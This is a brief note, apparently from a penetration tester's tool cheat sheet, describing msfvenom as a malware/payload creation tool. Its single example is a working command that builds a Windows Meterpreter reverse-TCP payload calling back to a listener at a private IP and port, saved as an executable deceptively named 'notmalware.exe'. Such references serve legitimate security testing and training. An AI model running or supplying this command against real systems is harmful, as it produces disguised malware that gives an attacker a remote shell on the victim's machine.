#tool-red/exploitation 

malware/payload creation tool

example: 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f exe -o notmalware.exe`
